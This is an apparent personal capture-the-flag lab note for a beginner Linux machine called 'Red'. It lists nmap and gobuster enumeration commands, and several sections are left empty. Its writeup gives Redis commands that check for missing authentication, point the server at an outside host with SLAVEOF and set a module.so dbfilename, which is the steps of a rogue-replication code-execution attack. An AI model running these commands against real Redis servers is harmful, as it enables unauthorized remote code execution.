---
tags: [Beginner, Linux, Video]
title: Red
created: '2020-07-13T08:06:51.777Z'
modified: '2020-10-02T17:42:38.228Z'
---

# Red
- IP: `172.31.1.9`
- OS: `Linux`
## Enumeration
### Writeup

```
INFO # Check for NOAUTH
SLAVEOF 10.10.0.8 1234
CONFIG SET dbfilename module.so
```

### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.9`
```

```
</details>

<details>
<summary>gobuster</summary>

- `gobuster dir --wordlist /usr/share/wordlists/dirb/big.txt --url http://172.31.1.9/ -x html,txt -o commands/gobuster-80-root`
```

```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
